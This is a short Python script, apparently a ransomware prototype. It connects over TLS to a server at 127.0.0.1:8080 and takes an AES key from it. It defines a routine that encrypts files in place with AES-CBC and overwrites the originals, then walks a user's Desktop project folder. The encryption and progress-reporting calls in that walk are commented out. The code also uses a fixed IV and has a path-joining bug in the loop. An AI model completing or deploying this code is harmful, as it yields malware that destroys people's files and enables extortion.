import socket
import ssl
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

iv = b"1234567890123456"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
fSock = ctx.wrap_socket(sock, server_hostname='127.0.0.1')
fSock.connect(('127.0.0.1', 8080))
print("Successfully connected to the server")
key = fSock.recv(32)  
print("Key received from server")

def encrypt_file(dirpath, key):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    
    with open(dirpath, 'rb') as file:
        data = file.read()
    
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    
    with open(dirpath, 'wb') as file:
        file.write(encrypted_data)

def all_files_in_directory(directory):
    for dirpath, _, filenames in os.walk(directory):
        for filename in filenames:
            dirpath = os.path.join(dirpath, filename)
            #encrypt_file(dirpath, key)
            #sock.sendall(f"Encrypting {dirpath}\n".encode())
            print(f"Encrypting {dirpath}")

all_files_in_directory("C:/Users/user/Desktop/react")